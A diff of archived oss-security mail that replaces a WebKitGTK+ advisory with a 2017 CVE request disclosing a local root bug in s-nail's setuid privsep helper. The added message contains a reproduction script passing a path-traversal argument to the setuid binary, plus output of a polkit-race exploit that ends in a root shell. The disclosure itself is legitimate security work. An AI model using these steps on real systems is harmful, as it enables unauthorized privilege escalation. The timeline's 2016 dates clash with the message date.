@@ -1,53 +1,111 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/25/3
-Message-ID: <6128ec04-31d7-6978-e1bd-41e70ef4cf7d@igalia.com>
-Date: Fri, 25 Aug 2017 18:27:59 +0200
-From: Carlos Alberto Lopez Perez <clopez@...lia.com>
-To: webkit-gtk@...ts.webkit.org
-Cc: security@...kit.org, distributor-list@...me.org, oss-security@...ts.openwall.com, bugtraq@...urityfocus.com
-Subject: WebKitGTK+ Security Advisory WSA-2017-0007
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/27/7
+Message-ID: <283810e2-2297-c139-39b1-3dde13babd49@yahoo.fr>
+Date: Fri, 27 Jan 2017 22:03:00 +0100
+From: wapiflapi <wapiflapi@...oo.fr>
+To: oss-security@...ts.openwall.com
+Cc: Steffen Nurpmeso <steffen@...oden.eu>
+Subject: CVE Request: s-nail local root
 Content-Type: text/plain; charset=utf-8
 
-------------------------------------------------------------------------
-WebKitGTK+ Security Advisory                               WSA-2017-0007
-------------------------------------------------------------------------
+Hi,
 
-Date reported      : August 25, 2017
-Advisory ID        : WSA-2017-0007
-Advisory URL       : https://webkitgtk.org/security/WSA-2017-0007.html
-CVE identifiers    : CVE-2017-1000121, CVE-2017-1000122.
+s-nail fixed a local root. This affects archlinux by default and other
+linux distros' packages (eg. ubuntu). Can we get a CVE for this ?
 
-Several vulnerabilities were discovered in WebKitGTK+.
+https://www.mail-archive.com/s-nail-users@lists.sourceforge.net/msg00551.html
 
-CVE-2017-1000121
-    Versions affected: WebKitGTK+ before 2.16.3.
-    Credit to Nathan Crandall.
-    Impact: Processing maliciously crafted input may lead to arbitrary
-    code execution or application crash. Description: An input
-    validation issue on the handling of UNIX IPC messages may allow an
-    attacker to trigger an integer overflow. The issue was addressed
-    through improved state management.
+Here is the advisory:
 
-CVE-2017-1000122
-    Versions affected: WebKitGTK+ before 2.16.3.
-    Credit to Nathan Crandall.
-    Impact: Processing maliciously crafted input may lead to application
-    crash. Description: An input validation issue on the handling of
-    UNIX IPC messages allows an attacker to trigger an application
-    crash. The issue was addressed through improved state management.
+Affects
+=======
+
+S-nail (later S-mailx) is a mail processing system. It is intended to
+provide the functionality of the POSIX mailx command. It is installed by
+default on archlinux and is pulled in on ubuntu whenever mailx is
+needed. It might be used elsewhere.
+
+There is a vulnerability in the setuid root helper binary s-nail uses to
+handle lock files:
+
+  - archlinux: /usr/lib/mail-privsep
+  - ubuntu:    /usr/lib/s-nail/s-nail/privsep
 
 
-We recommend updating to the last stable version of WebKitGTK+. It is
-the best way of ensuring that you are running a safe version of
-WebKitGTK+. Please check our website for information about the last
-stable releases.
+Reproducing the issue
+=====================
 
-Further information about WebKitGTK+ Security Advisories can be found
-at: https://webkitgtk.org/security.html
+The problem is that an O_EXCL file is created with a user controlled
+path because the di.di_hostname and di.di_randstr are never checked.
+This means that using s-nail-privsep a normal user can create a file
+anywhere on the filesystem, which is a security problem.
 
-The WebKitGTK+ team,
-August 25, 2017
+The command is very picky about it's arguments. Here is an example
+script setting up the bug. This runs the setuid binary under strace so
+we can see the call to open() that we control followed by a call to
+fchown() giving us ownership.
 
 
+```
+# On archlinux it should be: /usr/lib/mail-privsep
+PRIVSEP=/usr/lib/s-nail/s-nail-privsep;
 
-Download attachment "signature.asc" of type "application/pgp-signature" (898 bytes)
+# Some setup to get the directory traversal working.
+touch /tmp/foo
+mkdir -p /tmp/foo.lock.spam.eggs
+
+cd $(dirname $PRIVSEP);
+PATH=$PATH:. # argv[0] must be just the name.
+
+# stdin & stdout must be pipes !
+echo | strace -f $(basename $PRIVSEP) rdotlock \
+              mailbox /tmp/foo name /tmp/foo.lock \
+              hostname spam randstr eggs/../../../../../../../tmp/test \
+              pollmsecs 0 |& grep -E "foo\.lock\.spam\.eggs|chown";
+```
+
+
+Security Impact
+===============
+
+This issue can be leveraged by any logged in user to gain full root
+privileges.
+
+To exploit this we have to win a race condition and find a way to
+leverage the ephemeral file. We achieve this by adding a polkit policy
+and using pkexec su.
+
+A functional exploit is attached :-) Should look like this:
+
+```
+$ id
+uid=1000(wapiflapi) gid=1000(wapiflapi) groups=1000(wapiflapi)[...]
+$ ./s-nail-privget /usr/lib/s-nail/s-nail-privsep
+[=] s-nail-privsep local root by @wapiflapi
+[+] Started flood in /usr/share/polkit-1/actions/backdoor.policy
+[+] Started race with /usr/lib/s-nail/s-nail-privsep
+[=] This could take a while...
+[/] wait for it: done
+root@box:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+If the system doesn't have pkexec there are other ways to get root
+access from this. (`at` and `crontab` files come to mind.) The exploit
+is a bit slow (20s?), it's probably possible to be smarter about the
+race, but it's a poc ! ;-) Also if testing in a VM, having more than one
+cpu core helps a lot.
+
+
+Issue Timeline
+==============
+
+discovery:  26/01/2016
+disclosure: 27/01/2016
+vendor fix: 27/01/2016
+
+
+Regards,
+Wannes `wapiflapi` Rombouts
+
+View attachment "s-nail-privget.c" of type "text/x-csrc" (5025 bytes)
